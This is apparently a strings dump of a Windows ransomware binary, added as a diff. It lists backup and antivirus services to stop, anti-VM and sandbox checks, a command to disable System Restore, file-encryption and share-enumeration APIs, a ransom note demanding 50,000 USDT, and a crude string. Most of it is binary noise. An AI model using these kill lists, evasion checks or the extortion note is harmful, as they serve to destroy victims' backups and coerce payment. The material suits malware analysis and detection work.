@@ -1,0 +1,1200 @@
+!This program cannot be run in DOS mode.
+tRich
+.text
+`.data
+.pdata
+@.idata
+@.fptable
+.reloc
+memtas
+mepocs
+sophos
+veeam
+backup
+GxVss
+GxBlr
+GxFWD
+GxCVD
+GxCIMgr
+DefWatch
+ccEvtMgr
+ccSetMgr
+SavRoam
+RTVscan
+QBFCService
+QBIDPService
+Intuit.QuickBooks.FCS
+QBCFMonitorService
+YooBackup
+YooIT
+zhudongfangyu
+stc_raw_agent
+VSNAPVSS
+VeeamTransportSvc
+VeeamDeploymentService
+VeeamNFSSvc
+PDVFSService
+BackupExecVSSProvider
+BackupExecAgentAccelerator
+BackupExecAgentBrowser
+BackupExecDiveciMediaService
+BackupExecJobEngine
+BackupExecManagementService
+BackupExecRPCService
+AcrSch2Svc
+AcronisAgent
+CASAD2DWebSvc
+CAARCUpdateSvc
+IsWow64Process
+kernel32.dll
+Wow64DisableWow64FsRedirection
+Wow64RevertWow64FsRedirection
+ntdll.dll
+NtQueryInformationProcess
+SOFTWARE\VMware, Inc.\VMware Tools
+SYSTEM\ControlSet001\Services\vmdebug
+SYSTEM\ControlSet001\Services\vmmouse
+SOFTWARE\Oracle\VirtualBox Guest Additions
+SYSTEM\ControlSet001\Services\VBoxGuest
+HARDWARE\DEVICEMAP\Scsi\Scsi Port 0\Scsi Bus 0\Target Id 0\Logical Unit Id 0
+Identifier
+VIRTUAL
+sandbox
+malware
+virus
+sample
+currentuser
+SANDBOX
+MALWARE
+VIRUS
+SAMPLE
+C:\Windows\System32\*.dll
+US]CQ
+, Error Code: 
+SOFTWARE\Microsoft\Windows NT\CurrentVersion\SystemRestore
+DisableSR
+I am very sorry when you see this letter. Your computer has now been encrypted, and please do not move or modify anything on this computer beforehand. The internal network is slowly being infected, and the backup server may have already been compromised. Please send 50,000 USDT to this address within 5 days, and we will ensure that your data is not damaged and will be restored. Wishing you a pleasant day.
+Can't OpenProcess
+Can't RmGetList
+Can't RmRegisterResources
+Can't RmStartSession
+Can't open file after killHolder
+Can't MoveFileExW
+Can't FindFirstFileW
+DoYouWantToHaveSexWithCuongDong
+ong looks like h	
+* qWp
+AQLwH'
+LCMapStringEx
+LocaleNameToLCID
+AppPolicyGetProcessTerminationMethod
+Sunday
+Monday
+Tuesday
+Wednesday
+Thursday
+Friday
+Saturday
+January
+February
+March
+April
+August
+September
+October
+November
+December
+MM/dd/yy
+dddd, MMMM dd, yyyy
+HH:mm:ss
+ !"#$%&'()*+,-./0123456789:;<=>?@abcdefghijklmnopqrstuvwxyz[\]^_`abcdefghijklmnopqrstuvwxyz{|}~
+ !"#$%&'()*+,-./0123456789:;<=>?@ABCDEFGHIJKLMNOPQRSTUVWXYZ[\]^_`ABCDEFGHIJKLMNOPQRSTUVWXYZ{|}~
+CorExitProcess
+Unknown exception
+bad exception
+__based(
+__cdecl
+__stdcall
+__thiscall
+__fastcall
+__vectorcall
+__preserve_none
+__clrcall
+__eabi
+__swift_1
+__swift_2
+__swift_3
+__ptr64
+__restrict
+__unaligned
+restrict(
+ delete
+operator
+`vftable'
+`vbtable'
+`vcall'
+`typeof'
+`local static guard'
+`string'
+`vbase destructor'
+`vector deleting destructor'
+`default constructor closure'
+`scalar deleting destructor'
+`vector constructor iterator'
+`vector destructor iterator'
+`vector vbase constructor iterator'
+`virtual displacement map'
+`eh vector constructor iterator'
+`eh vector destructor iterator'
+`eh vector vbase constructor iterator'
+`copy constructor closure'
+`udt returning'
+`RTTI
+`local vftable'
+`local vftable constructor closure'
+ new[]
+ delete[]
+`omni callsig'
+`placement delete closure'
+`placement delete[] closure'
+`managed vector constructor iterator'
+`managed vector destructor iterator'
+`eh vector copy constructor iterator'
+`eh vector vbase copy constructor iterator'
+`dynamic initializer for '
+`dynamic atexit destructor for '
+`vector copy constructor iterator'
+`vector vbase copy constructor iterator'
+`managed vector copy constructor iterator'
+`local static thread guard'
+operator "" 
+operator co_await
+operator<=>
+ Type Descriptor'
+ Base Class Descriptor at (
+ Base Class Array'
+ Class Hierarchy Descriptor'
+ Complete Object Locator'
+`anonymous namespace'
+UUUUUU
+UUUUUU
+TUUUU
+=imb;D
+1<.	/>:
+/>58d%
+!>6'Y
+>jtm}S
+)>6{1n
+r	Vr.>T
++f)>0'
+Lj[;>
+3>fvw
+;H9>&X
+*StO9>T
+n03>Pu
+K~Je#>!
++M<7>
+c(>\,
+bp(=>?g
+BC?>6t9^	c:>
+BF>^G
+K&>.yC
+ 'L>[
+.xJ>Hf
+y\PD>!
+|b=})>
+c [1>H'
+uzKs@>
+3>N;kU
+	kE>fvw
+A>pP&
+V6E>`"(5
+0iN>/
++h->|
+@>%>b
+?:kP<
+?UUUUUU
+?f`Y4
+?QY^&
+?7zQ6$
+.CRT$XCA
+.CRT$XCZ
+.CRT$XIA
+.CRT$XIC
+.CRT$XIZ
+.CRT$XPA
+.CRT$XPX
+.CRT$XPXA
+.CRT$XPZ
+.CRT$XTA
+.CRT$XTZ
+.rdata
+.rdata$00
+.rdata$r
+.rdata$voltmd
+.rdata$zzzdbg
+.text$mn
+.text$mn$00
+.text$mn$21
+.text$x
+.xdata
+.xdata$x
+.data
+.data$r
+.data$rs
+.pdata
+.idata$5
+.00cfg
+.idata$2
+.idata$3
+.idata$4
+.idata$6
+.fptable
+@WAWH
+9D$@t
+9D$@u+
+D$ E3
+D$0E3
+D$ E3
+D$0E3
+t$ UWATAVAWH
+D9d$@s
+A_A^A\_]
+@SUVW
+utHcA<
+=t3E3
+UVAUAVI
+A3U(D
+VUUUA
+VUUUA
+A^A]^]
+)E'D3
+UVWATAUAVAWH
+A3A A3I$E3A,
+VUUUA
+VUUUA
+A_A^A]A\_^]
+USVWATAUAVAWH
+hA_A^A]A\_^[]
+@SUVAVAWH
+L$PL+
+L$PL+
+A_A^^][
+@USVWAVAWH
+L$`L+
+L$`L+
+nD$0f
+nD$8f
+nD$<f
+A_A^_^[]
+A_A^_^[]
+D$`HkE
+D$XHkE
+D$PHkE
+D$HHkE
+D$@HkE
+D$8HkE
+D$0HkD$x
+D$(HkD$p
+B H+A H
+B(H+A(H
+B0H+A0H
+B8H+A8H
+B@H+A@H
+BHH+AHH
+@SUVWATAVAWLc
+McV McO McF
+D$ Ic
+Mc^(McW(McN IcV
+McG L
+D$(Ic
+Ic^0Mc_0McV McN
+McF(IcN
+IcW(H
+IcG L
+D$0Ic
+Ic~8Ic_8Mc^0McV(McF IcW0IcN
+McO(H
+IcG H
+L$8Ic
+Icv@Ic
+@Ic^0Mc^ McW0H
+IcG L
+McN8L
+McG8IcN(IcV
+IcG(H
+D$@Ic
+IcnHIcwHIc~@Ic^8Mc^0McW@McF(IcW8IcN McO0H
+IcG L
+IcG(H
+L$HIcF
+IcW8IcN(H
+IcG(H
+IcN8H
+IcOHH
+IcNHH
+IcN IcG0H
+QIcO@H
+IcG H
+IcN0H
+IcN@H
+T$PIcF IcW8IcN(H
+IcG0H
+IcO@H
+IcG(H
+IcN0H
+IcOHH
+IcG H
+IcN8H
+IcN@H
+IcNHH
+T$XIcG8IcV(IcN8H
+IcG(H
+IcOHH
+IcNHH
+IcF H
+IcO@H
+IcG0H
+QIcN0H
+IcG H
+IcN@H
+T$`IcF(IcW@IcN0H
+IcG8H
+IcF H
+IcOHH
+IcG0H
+IcN8H
+IcG(H
+IcN@H
+IcG H
+IcNHH
+T$hIcF(IcWHIcN8H
+IcG8H
+IcG(H
+IcNHH
+IcG@H
+IcN0H
+IcG0H
+QIcN@H
+T$pIcG@IcV8IcOHH
+IcF0H
+IcG8H
+IcN@H
+IcG0H
+IcNHH
+T$xIcGHIcV8IcNHH
+IcG8H
+IcG@H
+IcN@H
+IcGHIcV@IcNHH
+IcG@H
+IcNHIcGHH
+A_A^A\_^][
+A0HkAx
+A(HkAp
+A HkAh
+IcS IcK
+McC(IcK IcS
+McC0IcS(IcK McK
+McK8McC0IcK(IcS L
+McK@McC0IcS8IcK(McS L
+McSHMcK@IcS8IcK0McC(L
+IcC L
+CHIcC
+IcS8IcKHMcK(H
+IcC H
+IcK0H
+QIcK@H
+CPIcC(IcS0IcK8H
+IcC H
+IcK@H
+IcKHH
+SXMcC0IcC(IcS8IcKHH
+IcC H
+IcK@H
+C`IcC0IcS8IcK@H
+IcC(H
+IcC H
+IcKHH
+ShIcC0IcS@IcKHMcC8H
+IcC(H
+CpIcC8IcS@IcKHH
+IcC0H
+SxIcC8IcS@IcKHH
+IcCHIcK@H
+IcCHH
+UVWATAUAVAWH
+L$ A+
+L$$A+
+0A_A^A]A\_^]
+USVWATAUAVAWH
+D$`HkE
+D$XHkE
+D$PHkE
+D$HHkE
+D$@HkE
+D$8HkE
+D$0HkD$x
+D$(HkD$p
+D$`HkE
+D$XHkE
+D$PHkE
+D$HHkE
+D$@HkE
+D$8HkE
+D$0HkD$x
+D$(HkD$p
+D$`HkE
+D$XHkE
+D$PHkE
+D$HHkE
+D$@HkE
+D$8HkE
+D$0HkD$x
+D$(HkD$p
+D$`HkE
+D$XHkE
+D$PHkE
+D$HHkE
+D$@HkE
+D$8HkE
+D$0HkD$x
+D$(HkD$p
+G0HkGx
+G(HkGp
+G HkGh
+C0HkCx
+C(HkCp
+C HkCh
+A_A^A]A\_^[]
+3C A#
+C HcC H3
+C IcS(
+3C(A#
+C(HcC(H3
+C(IcS0
+3C0A#
+C0HcC0H3
+C0IcS8
+3C8A#
+C8HcC8H3
+C8IcS@
+3C@A#
+C@HcC@H3
+C@IcSH
+3CHA#
+CHHcCHH3
+USVWATAUAVAWH
+A_A^A]A\_^[]
+@USVWH
+D$`HkE
+D$XHkE
+D$PHkE
+D$HHkE
+D$@HkE
+D$8HkE
+D$0HkD$x
+D$(HkD$p
+D$`HkE
+D$XHkE
+D$PHkE
+D$HHkE
+D$@HkE
+D$8HkE
+D$0HkD$x
+D$(HkD$p
+D$`HkE
+D$XHkE
+D$PHkE
+D$HHkE
+D$@HkE
+D$8HkE
+D$0HkD$x
+D$(HkD$p
+D$`HkE
+D$XHkE
+D$PHkE
+D$HHkE
+D$@HkE
+D$8HkE
+D$0HkD$x
+D$(HkD$p
+D$`HkE
+D$XHkE
+D$PHkE
+D$HHkE
+D$@HkE
+D$8HkE
+D$0HkD$x
+D$(HkD$p
+D$`HkE
+D$XHkE
+D$PHkE
+D$HHkE
+D$@HkE
+D$8HkE
+D$0HkD$x
+D$(HkD$p
+D$`HkE
+D$XHkE
+D$PHkE
+D$HHkE
+D$@HkE
+D$8HkE
+D$0HkD$x
+D$(HkD$p
+D$`HkE
+D$XHkE
+D$PHkE
+D$HHkE
+D$@HkE
+D$8HkE
+D$0HkD$x
+D$(HkD$p
+D$`HkE
+D$XHkE
+D$PHkE
+D$HHkE
+D$@HkE
+D$8HkE
+D$0HkD$x
+D$(HkD$p
+D$`HkE
+D$XHkE
+D$PHkE
+D$HHkE
+D$@HkE
+D$8HkE
+D$0HkD$x
+D$(HkD$p
+D$`HkE
+D$XHkE
+D$PHkE
+D$HHkE
+D$@HkE
+D$8HkE
+D$0HkD$x
+D$(HkD$p
+D$`HkE
+D$XHkE
+D$PHkE
+D$HHkE
+D$@HkE
+D$8HkE
+D$0HkD$x
+D$(HkD$p
+D$`HkE
+D$XHkE
+D$PHkE
+D$HHkE
+D$@HkE
+D$8HkE
+D$0HkD$x
+D$(HkD$p
+D$`HkE
+D$XHkE
+D$PHkE
+D$HHkE
+D$@HkE
+D$8HkE
+D$0HkD$x
+D$(HkD$p
+D$`HkE
+D$XHkE
+D$PHkE
+D$HHkE
+D$@HkE
+D$8HkE
+D$0HkD$x
+D$(HkD$p
+D$`HkE
+D$XHkE
+D$PHkE
+D$HHkE
+D$@HkE
+D$8HkE
+D$0HkD$x
+D$(HkD$p
+D$`HkE
+D$XHkE
+D$PHkE
+D$HHkE
+D$@HkE
+D$8HkE
+D$0HkD$x
+D$(HkD$p
+D$`HkE
+D$XHkE
+D$PHkE
+D$HHkE
+D$@HkE
+D$8HkE
+D$0HkD$x
+D$(HkD$p
+D$`HkE
+D$XHkE
+D$PHkE
+D$HHkE
+D$@HkE
+D$8HkE
+D$0HkD$x
+D$(HkD$p
+D$`HkE
+D$XHkE
+D$PHkE
+D$HHkE
+D$@HkE
+D$8HkE
+D$0HkD$x
+D$(HkD$p
+D$`HkE
+D$XHkE
+D$PHkE
+D$HHkE
+D$@HkE
+D$8HkE
+D$0HkD$x
+D$(HkD$p
+D$`HkE
+D$XHkE
+D$PHkE
+D$HHkE
+D$@HkE
+D$8HkE
+D$0HkD$x
+D$(HkD$p
+D$`HkE
+D$XHkE
+D$PHkE
+D$HHkE
+D$@HkE
+D$8HkE
+D$0HkD$x
+D$(HkD$p
+D$`HkE
+D$XHkE
+D$PHkE
+D$HHkE
+D$@HkE
+D$8HkE
+D$0HkD$x
+D$(HkD$p
+D$`HkE
+D$XHkE
+D$PHkE
+D$HHkE
+D$@HkE
+D$8HkE
+D$0HkD$x
+D$(HkD$p
+D$`HkE
+D$XHkE
+D$PHkE
+D$HHkE
+D$@HkE
+D$8HkE
+D$0HkD$x
+D$(HkD$p
+D$`HkE
+D$XHkE
+D$PHkE
+D$HHkE
+D$@HkE
+D$8HkE
+D$0HkD$x
+D$(HkD$p
+D$`HkE
+D$XHkE
+D$PHkE
+D$HHkE
+D$@HkE
+D$8HkE
+D$0HkD$x
+D$(HkD$p
+D$`HkE
+D$XHkE
+D$PHkE
+D$HHkE
+D$@HkE
+D$8HkE
+D$0HkD$x
+D$(HkD$p
+D$`HkE
+D$XHkE
+D$PHkE
+D$HHkE
+D$@HkE
+D$8HkE
+D$0HkD$x
+D$(HkD$p
+D$`HkE
+D$XHkE
+D$PHkE
+D$HHkE
+D$@HkE
+D$8HkE
+D$0HkD$x
+D$(HkD$p
+D$`HkE
+D$XHkE
+D$PHkE
+D$HHkE
+D$@HkE
+D$8HkE
+D$0HkD$x
+D$(HkD$p
+D$`HkE
+D$XHkE
+D$PHkE
+D$HHkE
+D$@HkE
+D$8HkE
+D$0HkD$x
+D$(HkD$p
+D$`HkE
+D$XHkE
+D$PHkE
+D$HHkE
+D$@HkE
+D$8HkE
+D$0HkD$x
+D$(HkD$p
+D$`HkE
+D$XHkE
+D$PHkE
+D$HHkE
+D$@HkE
+D$8HkE
+D$0HkD$x
+D$(HkD$p
+D$`HkE
+D$XHkE
+D$PHkE
+D$HHkE
+D$@HkE
+D$8HkE
+D$0HkD$x
+D$(HkD$p
+D$`HkE
+D$XHkE
+D$PHkE
+D$HHkE
+D$@HkE
+D$8HkE
+D$0HkD$x
+D$(HkD$p
+\$(E3
+D$ E3
+D$ E3
+USAUH
+l$0E3
+M0$?H
+(D$@L
+(L$PH
+@SVWAVAWH
+ A_A^_^[
+ A_A^_^[
+@SUVWATAUAVAWH
+L9%B?
+8*tdH
+(A_A^A]A\_^][
+choung d
+ot dog!!f
+\$0E3
+\$0E3
+gfffffffI
+VUUUUUUUI
+gfffffffI
+uufff
+UVWATAUAVAWH
+H9=_'
+A_A^A]A\_^]
+<V,u	3
+t$8E3
+t$0E3
+@SVWD
+V<_^[
+F<_^[
+@SUVWAVH
+ A^_^][
+@SUVWH
+L$ H;
+D$ L;
+h_^][
+|$ E3
+D$(E3
+T$P$?I
+D$(E3
+D$PE3
+t$(E3
+t$0E3
+t$(E3
+@SUVWAVH
+PA^_^][
+D$8E3
+L$0E3
+D$ E3
+D$ E3
+\$PE3
+D$ E3
+D$@E3
+D$(E3
+s1fff
+@SUVWAUAVH
+\.	I+
+XA^A]_^][
+UVWATAUAVAWH
+ A_A^A]A\_^]
+UVWAVH
+xA^_^]
+SWATH
+pA\_[
+LcFLH
+t$ WH
+LcGHH
+t$ WH
+\$0LcGHH
+@USVWAVAWH
+A_A^_^[]
+A_A^_^[]
+@USVWAVAWH
+A_A^_^[]
+)D$ D
+)L$0H
+)L$PI
+UVWATAUAVAWH
+D#t$0A
+;t$lA
+#D$HD#T$D3
+L$(D3
+;t$LA
+D$(D3
+3D$8D#
+D#T$PL
+D$(D3
+D$0E#
+;t$`A
+D$(D3
+L$8E#
+D$(D3
+T$4A3
+D$(D3
+L$<D;
+#D$4A
+D$(D3
+t$XD3
+D$pD3
+d$HD#
+d$PD3
+A_A^A]A\_^]
+@SUAVH
+@A^][
+@A^][
+@A^][
+D$0@8{
+UWAVH
+t$ WATAUAVAWH
+ A_A^A]A\_
+L$ WH
+L$ WH
+L$ WH
+WAVAWH
+ A_A^_
+L$ WH
+UWAVH
+\$0H;
+L$0H;
+l$ VWATAVAWH
+L$&8\$&t,8Y
+L$8H3
+A_A^A\_^
+t%fff
+@UATAUAVAWH
+e0A_A^A]A\]
+L$ WH
+u3HcH<H
+L$ WH
+t$ WATAUAVAWH
+D!|$xA
+A_A^A]A\_
+D$(H;
+@UATAUAVAWH
+Hc}`I
+A_A^A]A\]
+L$ WH
+WAVAWH
+ A_A^_
+@SUVWATAUAVAWH
+|$8;3
+HA_A^A]A\_^][
+t7HcP
+t	=csm
+@SUVWH
+(_^][
+l$ VWATAVAWH
+~QD;t
+T$`E3
+ A_A^A\_^
+l$ VATAUAVAWH
+|$`fff
+T$PE3
+ A_A^A]A\^
+ A_A^A]A\^
+@SUVWATAVH
+8A^A\_^][
+D$`Hc
+L$XE3
+H;XXs
+H;xXu5
+@SUVWH
+H_^][
+\$ IcX
+L$@;|
+tVHcY
+tYHcY
+@SVWAVAWH
+tuIc^
+tPIc^
+0A_A^_^[
+0A_A^_^[
+@SUVWATAVAWH
+L9h8t:
+D$dD;
+M0HcY
+~1Hc>
+D$dD;
+A_A^A\_^][
+UVAUAVH
+tC=RCC
+A^A]^]
+@SUWAVH
+t$PHcw
+tTHc_
+(A^_][
+(A^_][
+(A^_][
+@SUVWAVAWH
+G0Hch
+XA_A^_^][
+XA_A^_^][
+@SVWATAUAVAWH
+D$0L9
+A_A^A]A\_^[
+B(I9A(u
+SVWATAUAVAWH
+|$$Hc^
+t}Hc^
+@A_A^A]A\_^[
+@A_A^A]A\_^[
+ATAUH
+|$0@2
+t$(E3
+|$XD92
+E0Hch
+E0HcX
+8A]A\
+t$ WH
+x AVH
+E8q(u
+fD94H}aD
+@SUVWATAVAWH
+L$0H3
+@A_A^A\_^][
+t$ WATAUAVAWH
+0A_A^A]A\_
+x AVH
+L$ WH
+L$ VWAVH
+\$8I;
+`A^_^
+L$ WH
+UVWATAUAVAWH
+A8z(u
+fB9<I}1L
+A_A^A]A\_^]
+\$@H;
+\$@H;
+L$0H+
+VWATAVAW
+L$PI;
+D$PL+
+A_A^A\_^
+VATAUAVAWH
+0A_A^A]A\^
+@USVWATAUAVAWH
+H!D$ E
+hA_A^A]A\_^[]
+L$ WH
+LcA<E3
+@SUVWAVH
+ A^_^][
+ A^_^][
+fffff
+fffffff
+fffffff
+fffffff
+ffffff
+fffff
+vKfffff
+@SUWH
+curvpattern
+zvr/<$'
+r(2qI
+                          
+abcdefghijklmnopqrstuvwxyz
+ABCDEFGHIJKLMNOPQRSTUVWXYZ
+                          
+abcdefghijklmnopqrstuvwxyz
+ABCDEFGHIJKLMNOPQRSTUVWXYZ
+.?AVbad_exception@std@@
+.?AVexception@std@@
+.?AVtype_info@@
+FindFirstVolumeW
+FindNextVolumeW
+FindVolumeClose
+GetDriveTypeW
+GetVolumePathNamesForVolumeNameW
+CloseHandle
+GetLastError
+Sleep
+GetCurrentProcess
+TerminateProcess
+OpenProcess
+GetTickCount
+GetModuleHandleA
+GetProcAddress
+LoadLibraryA
+lstrcmpW
+lstrlenW
+SetVolumeMountPointW
+CreateToolhelp32Snapshot
+Process32FirstW
+Process32NextW
+FindClose
+FindFirstFileA
+FindNextFileA
+GetDiskFreeSpaceExA
+IsDebuggerPresent
+CheckRemoteDebuggerPresent
+GlobalMemoryStatusEx
+GetSystemInfo
+GetComputerNameA
+Process32First
+Process32Next
+CreateFileW
+WriteFile
+InitializeCriticalSection
+EnterCriticalSection
+LeaveCriticalSection
+DeleteCriticalSection
+lstrlenA
+WaitForMultipleObjects
+CreateThread
+GetFileSizeEx
+ReadFile
+SetFileAttributesW
+SetFilePointer
+lstrcpyW
+lstrcatW
+MoveFileExW
+GetCommandLineW
+FindFirstFileW
+FindNextFileW
+GetLogicalDrives
+SetFilePointerEx
+WaitForSingleObject
+CreateMutexA
+GetCurrentProcessId
+ExitProcess
+ExitThread
+CreateProcessW
+SetProcessShutdownParameters
+GetModuleFileNameW
+lstrcmpiW
+OpenMutexA
+WideCharToMultiByte
+CreateDirectoryW
+GetVolumeInformationA
+HeapAlloc
+HeapFree
+GetProcessHeap
+ReleaseSemaphore
+CreateSemaphoreA
+KERNEL32.dll
+wsprintfA
+wsprintfW
+USER32.dll
+CryptAcquireContextW
+CloseServiceHandle
+ControlService
+EnumDependentServicesA
+OpenSCManagerA
+OpenServiceA
+QueryServiceStatusEx
+GetUserNameA
+RegCloseKey
+RegOpenKeyExA
+RegQueryValueExA
+RegSetValueExA
+CryptReleaseContext
+CryptGenRandom
+RegCreateKeyExW
+RegOpenKeyExW
+RegQueryValueExW
+RegSetValueExW
+CryptAcquireContextA
+CryptDestroyKey
+CryptImportKey
+CryptEncrypt
+ADVAPI32.dll
+ShellExecuteW
+SHEmptyRecycleBinA
+CommandLineToArgvW
+SHELL32.dll
+NetShareEnum
+NetApiBufferFree
+NETAPI32.dll
+RmStartSession
+RmEndSession
+RmRegisterResources
+RmGetList
+RstrtMgr.DLL
+WNetGetConnectionW
+WNetOpenEnumW
+WNetEnumResourceW
+WNetCloseEnum
+MPR.dll
+IsProcessorFeaturePresent
+GetSystemTimeAsFileTime
+RtlCaptureContext
+RtlLookupFunctionEntry
+RtlVirtualUnwind
+UnhandledExceptionFilter
+SetUnhandledExceptionFilter
+SetLastError
+FlsGetValue
+FlsSetValue
+InitializeCriticalSectionEx
+VirtualProtect
+FreeLibrary
+LoadLibraryExW
+LCMapStringW
+IsValidCodePage
+GetACP
+GetOEMCP
+GetCPInfo
+GetStringTypeW
+MultiByteToWideChar
+GetModuleHandleW
+GetModuleHandleExW
+HeapSize
+HeapReAlloc
+RtlUnwindEx
+EncodePointer
+RaiseException
+RtlPcToFileHeader
+SetStdHandle
+FlushFileBuffers
+GetConsoleOutputCP
+GetConsoleMode
+WriteConsoleW
